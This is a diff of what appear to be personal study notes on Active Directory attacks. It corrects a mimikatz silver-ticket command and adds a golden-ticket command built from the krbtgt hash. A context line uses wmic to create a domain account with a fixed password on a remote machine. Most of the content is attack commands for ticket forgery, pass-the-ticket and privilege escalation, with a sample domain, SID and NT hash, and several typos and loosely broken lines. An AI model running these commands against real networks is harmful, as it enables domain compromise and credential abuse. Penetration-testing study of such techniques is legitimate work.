@@ -153,7 +153,7 @@
         .\mimikatz  # only execute on Adminis account
         mimikatz# privilege::debug # to read the ram area of other process
 
-        mimikatz # kerberos::golden /dis:S-1-5-21-1645150849-1307760504-3167438930-1104 /domain:goodboy.com /ptt 
+        mimikatz # kerberos::golden /sid:S-1-5-21-1645150849-1307760504-3167438930-1104 /domain:goodboy.com /ptt 
             target:sqladmin.goodboy.com /service:MSSQL /rc4:4DDEC0A4C1B022C5FD8503826FBFB7F2 /user:bob
                 # ppt means pass the ticket. rc4 is the NT hash of the passwd of user, need to convert to NThash like cyberchef
 
@@ -211,6 +211,11 @@
 
 
         wmic /node:"IP of another pc or dc" process call create "net user administator Passw0rd123 /domain"  # or "cmd"
-      
+
+# krbtgt account hash used to crypt a created TGT declaim as a DC admin, to privi escal 
+    domian SID
+    
+    mimikatz # kerberos::golden user:(wahtever) /domain:goodboy.com /sid:S-1-5-21-1645150849-1307760504-3167438930-1104 
+              /krbtgt:(hash of krbtgt) /ptt
 
 
